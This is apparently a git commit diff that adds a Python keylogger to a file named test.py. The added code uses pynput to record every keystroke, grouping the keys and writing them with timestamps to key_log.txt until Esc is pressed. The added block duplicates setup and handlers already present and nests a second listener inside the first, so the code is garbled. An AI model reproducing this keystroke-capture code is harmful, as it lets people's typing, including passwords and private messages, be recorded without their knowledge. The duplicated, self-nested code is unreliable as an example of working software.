381932bfb341456ceda29cbd86856b77b5ea8def
yusuf okuducu <k.yusufokuducu@gmail.com>
2024-12-18 23:15:59 +0300

    dahabuyukeyvah

--- test.py
+++ test.py
@@ -23,6 +23,40 @@ with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     
     # Set up logging
     logging.basicConfig(filename="key_log.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')
+    # Set up logging
+    logging.basicConfig(filename="key_log.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')
+    
+    # Buffer to hold keystrokes
+    keystroke_buffer = []
+    last_time = time.time()
+    grouping_interval = 0.5  # Time interval in seconds to group keystrokes
+    
+    def log_keystrokes():
+        global last_time
+        current_time = time.time()
+        
+        # Check if the time since the last log is greater than the grouping interval
+        if current_time - last_time >= grouping_interval:
+            if keystroke_buffer:
+                logging.info(' '.join(keystroke_buffer))  # Log the grouped keystrokes
+                keystroke_buffer.clear()  # Clear the buffer after logging
+            last_time = current_time  # Update last log time
+    
+    def on_press(key):
+        try:
+            keystroke_buffer.append(key.char)  # Add the character to the buffer
+        except AttributeError:
+            keystroke_buffer.append(str(key))  # Log special keys as strings
+        log_keystrokes()  # Log the buffer if conditions are met
+    
+    def on_release(key):
+        if key == keyboard.Key.esc:
+            # Stop listener
+            return False
+    
+    # Collect events until released
+    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
     
     # Buffer to hold keystrokes
     keystroke_buffer = []
